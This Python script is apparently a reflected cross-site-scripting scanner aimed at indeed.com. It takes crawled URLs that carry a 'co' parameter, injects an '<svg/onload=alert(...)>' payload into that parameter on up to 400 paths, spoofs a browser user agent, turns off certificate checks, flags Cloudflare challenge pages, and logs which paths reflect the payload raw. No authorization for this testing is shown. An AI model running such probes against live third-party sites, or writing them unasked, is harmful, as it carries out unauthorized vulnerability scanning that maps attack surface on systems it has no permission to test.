import collections
import json
import re
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlsplit

import requests
import urllib3

urllib3.disable_warnings()
sys.path.insert(0, "/opt/watch")

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
CANARY = "40931"
TOK = "zqco4093"
PAY = f'"><svg/onload=alert({CANARY})>'
CHAL = re.compile(r"cType:\s*'managed'|Just a moment|__cf_chl_", re.I)

# candidate indeed.com paths from the crawl that carry co
urls = json.load(open("/opt/watch/logs/indeed/param_urls.json"))
paths = set()
for u in urls:
    p = urlsplit(u)
    h = p.netloc.lower()
    if not h.endswith("indeed.com"):
        continue
    if "co" not in p.query:
        continue
    paths.add((h, p.path))
print("distinct (host,path) carrying co:", len(paths))

def test(item):
    host, path = item
    u = f"https://{host}{path}?co=" + requests.utils.quote(PAY, safe="")
    try:
        r = requests.get(u, timeout=12, verify=False, headers=UA, allow_redirects=False)
    except Exception:
        return None
    body = r.text or ""
    return {"host": host, "path": path, "status": r.status_code, "len": len(body),
            "challenge": bool(CHAL.search(body)),
            "raw": f"<svg/onload=alert({CANARY})" in body,
            "tok": TOK in body}

items = sorted(paths)[:400]
rows = []
with ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(test, items):
        if r:
            rows.append(r)

openers = [r for r in rows if r["status"] == 200 and not r["challenge"]]
print(f"\ntested {len(rows)}: open(200,no-challenge)={len(openers)}")
print("status mix:", dict(collections.Counter(r["status"] for r in rows)))
print("\nnon-blocked paths (these are the reachable surface):")
for r in openers[:40]:
    print(f"  {r['status']} len={r['len']:7} tok={r['tok']} {r['host']}{r['path'][:60]}")
json.dump(rows, open("/opt/watch/logs/indeed/co_reachability.json", "w"), indent=1)
